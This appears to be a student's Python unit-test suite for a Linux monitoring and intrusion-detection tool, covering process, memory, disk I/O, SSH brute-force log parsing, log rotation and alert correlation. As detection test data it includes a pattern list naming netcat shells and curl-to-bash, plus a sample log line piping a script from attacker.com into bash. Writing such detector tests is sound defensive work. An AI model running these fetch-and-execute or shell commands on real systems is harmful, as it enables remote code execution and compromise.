#!/usr/bin/env python3
"""
Master Test Suite for Cyber Sentinel (CO2, CO4, CO5, CO6 Verification)
Student: NITHIN N | Roll Number: 25BTRPW066
Verifies process management, memory paging, storage I/O, log parsing,
and safe copytruncate log rotation with SHA-256 verification.
"""

import os
import sys
import time
import shutil
import unittest
import tempfile

# Adjust path to import src
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, BASE_DIR)

from src.process_monitor import ProcessMonitor, ProcessInfo
from src.memory_monitor import MemoryMonitor
from src.io_monitor import IOMonitor
from src.log_analyzer import LogAnalyzer, SecurityAlert
from src.log_rotator import SafeLogRotator
from src.alert_manager import AlertManager


class TestCyberSentinelSuite(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.test_dir = tempfile.mkdtemp(prefix="sentinel_test_")
        cls.test_cfg = {
            "thresholds": {
                "process_cpu_warning_pct": 50.0,
                "process_cpu_critical_pct": 75.0,
                "process_memory_mb_warning": 200.0,
                "system_memory_warning_pct": 80.0,
                "system_memory_critical_pct": 90.0,
                "iowait_warning_pct": 15.0,
                "iowait_critical_pct": 35.0,
                "io_write_mbs_warning": 20.0
            },
            "security_rules": {
                "ssh_brute_force_threshold": 3,
                "ssh_brute_force_window_sec": 30,
                "sudo_failure_threshold": 2,
                "suspicious_patterns": [r"xmrig", r"nc\s+-e", r"curl.*\|.*bash"]
            },
            "log_rotation": {
                "max_log_size_bytes": 1024 * 50,  # 50 KB for testing
                "archive_dir": os.path.join(cls.test_dir, "archives"),
                "max_archives": 3,
                "strategy": "copytruncate",
                "verify_sha256": True,
                "target_logs": [os.path.join(cls.test_dir, "test_auth.log")]
            }
        }

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.test_dir, ignore_errors=True)

    # --------------------------------------------------------------------------
    # CO2: Process and CPU Management
    # --------------------------------------------------------------------------
    def test_co2_process_inspection_and_rogue_detection(self):
        pm = ProcessMonitor(self.test_cfg)
        procs = pm.get_all_processes()
        self.assertGreater(len(procs), 0, "Process monitor should return active processes")

        # Inject simulated rogue miner
        rogue = ProcessInfo(
            pid=9999,
            ppid=1,
            name="xmrig_malware",
            user="evil",
            state="R",
            cpu_percent=89.4,
            memory_rss_mb=250.0,
            memory_vsz_mb=500.0,
            memory_percent=3.2,
            cmdline="./xmrig_malware --pool stratum+tcp://c2.xyz",
            is_suspicious=True,
            suspicious_reasons=["Cryptominer signature"]
        )
        pm.inject_simulated_process(rogue)
        
        flagged = pm.detect_rogue_processes()
        self.assertTrue(any(p.pid == 9999 for p in flagged), "Rogue miner must be flagged by detector")

        # Test remediation
        res = pm.remediate_process(9999, action="renice", nice_val=19)
        self.assertTrue(res["success"], "Renice remediation must succeed")
        
        res_kill = pm.remediate_process(9999, action="sigterm")
        self.assertTrue(res_kill["success"], "Kill remediation must succeed")

    # --------------------------------------------------------------------------
    # CO4: Memory Management & Paging Subsystem
    # --------------------------------------------------------------------------
    def test_co4_memory_telemetry(self):
        mm = MemoryMonitor(self.test_cfg)
        metrics = mm.get_metrics()
        self.assertGreater(metrics.total_mb, 0, "Total RAM should be positive")
        self.assertGreaterEqual(metrics.utilization_pct, 0.0)
        self.assertLessEqual(metrics.utilization_pct, 100.0)
        self.assertIsInstance(metrics.warning_messages, list)

    # --------------------------------------------------------------------------
    # CO5: Storage Hierarchy, Filesystem & I/O
    # --------------------------------------------------------------------------
    def test_co5_storage_io_metrics(self):
        iom = IOMonitor(self.test_cfg)
        metrics = iom.get_metrics(self.test_dir)
        self.assertGreater(metrics.disk_total_gb, 0.0)
        self.assertGreaterEqual(metrics.inodes_free, 0)
        self.assertGreaterEqual(metrics.iowait_pct, 0.0)

    # --------------------------------------------------------------------------
    # CO6: Cybersecurity Log Analysis (SSH & Sudo)
    # --------------------------------------------------------------------------
    def test_co6_log_analysis_intrusion_signatures(self):
        la = LogAnalyzer(self.test_cfg)
        test_ip = "192.168.1.200"

        # 3 Failed attempts triggers threshold (threshold=3)
        a1 = la.analyze_log_line(f"Nov 02 12:00:01 srv sshd[101]: Failed password for invalid user root from {test_ip} port 5001 ssh2")
        a2 = la.analyze_log_line(f"Nov 02 12:00:02 srv sshd[102]: Failed password for invalid user root from {test_ip} port 5002 ssh2")
        a3 = la.analyze_log_line(f"Nov 02 12:00:03 srv sshd[103]: Failed password for invalid user root from {test_ip} port 5003 ssh2")

        self.assertIsNone(a1)
        self.assertIsNone(a2)
        self.assertIsNotNone(a3, "3rd attempt must trigger SSH_BRUTE_FORCE_ATTACK alert")
        self.assertEqual(a3.rule_name, "SSH_BRUTE_FORCE_ATTACK")
        self.assertEqual(a3.severity, "CRITICAL")
        self.assertEqual(a3.source_ip, test_ip)

        # Command injection check
        cmd_alert = la.analyze_log_line("Nov 02 12:00:10 srv audit[99]: CMD=curl -s http://attacker.com/sh | bash")
        self.assertIsNotNone(cmd_alert)
        self.assertEqual(cmd_alert.rule_name, "SUSPICIOUS_PAYLOAD_DETECTED")

    # --------------------------------------------------------------------------
    # CO5 & CO6: Safe Atomic Copytruncate Log Rotation & SHA-256
    # --------------------------------------------------------------------------
    def test_co5_safe_copytruncate_rotation_and_checksum(self):
        rotator = SafeLogRotator(self.test_cfg)
        test_log = os.path.join(self.test_dir, "test_auth.log")

        # Write > 50KB data to breach rotation threshold
        with open(test_log, "w") as f:
            for i in range(1200):
                f.write(f"Nov 02 12:00:{i%60:02d} server daemon[{i}]: Telemetry log line {i}\n")

        size_before = os.path.getsize(test_log)
        self.assertGreater(size_before, 50 * 1024, "File size must exceed 50KB threshold")

        record = rotator.rotate_file_if_needed(test_log)
        self.assertIsNotNone(record)
        self.assertTrue(record.success, "Log rotation must succeed")
        self.assertTrue(os.path.exists(record.archive_file), "Compressed archive must exist")
        self.assertTrue(record.archive_file.endswith(".gz"))
        
        # Verify copytruncate safely emptied source file
        size_after = os.path.getsize(test_log)
        self.assertEqual(size_after, 0, "Original file must be truncated to 0 bytes")

        # Verify SHA-256 hash calculation
        computed_hash = SafeLogRotator.compute_sha256(record.archive_file)
        self.assertEqual(computed_hash, record.sha256_checksum, "SHA-256 checksum must match file content")
        self.assertEqual(len(computed_hash), 64, "SHA-256 must be a 64-character hexadecimal digest")

        # Verify manifest file exists
        manifest = record.archive_file + ".meta.json"
        self.assertTrue(os.path.exists(manifest), "Archive manifest must exist")

    # --------------------------------------------------------------------------
    # Cross-Subsystem Incident Correlation Engine
    # --------------------------------------------------------------------------
    def test_correlation_engine(self):
        am = AlertManager(self.test_cfg)
        sec_alert = SecurityAlert(
            timestamp="2026-11-02 12:00:00",
            rule_name="SSH_BRUTE_FORCE_ATTACK",
            severity="CRITICAL",
            source_ip="192.168.1.189",
            target_user="root",
            description="Brute force",
            raw_log="sample"
        )
        rogue_proc = ProcessInfo(
            pid=7777,
            ppid=1,
            name="xmrig",
            user="evil",
            state="R",
            cpu_percent=92.1,
            memory_rss_mb=300.0,
            memory_vsz_mb=600.0,
            memory_percent=4.0,
            cmdline="./xmrig",
            is_suspicious=True,
            suspicious_reasons=["High CPU"]
        )

        incidents = am.correlate_telemetry(
            security_alerts=[sec_alert],
            rogue_processes=[rogue_proc],
            io_metrics=None,
            memory_metrics=None
        )
        self.assertGreater(len(incidents), 0)
        self.assertEqual(incidents[0].category, "COORDINATED_ATTACK")
        self.assertEqual(incidents[0].severity, "CRITICAL")
        self.assertIn("Post-Compromise", incidents[0].title)


if __name__ == "__main__":
    print("\033[1;36m==============================================================================\033[0m")
    print("\033[1;32m      RUNNING CYBER SENTINEL AUTOMATED UNIT & INTEGRATION TEST SUITE\033[0m")
    print("\033[1;37m      Student: NITHIN N  |  Roll Number: 25BTRPW066\033[0m")
    print("\033[1;36m==============================================================================\033[0m")
    unittest.main(verbosity=2)
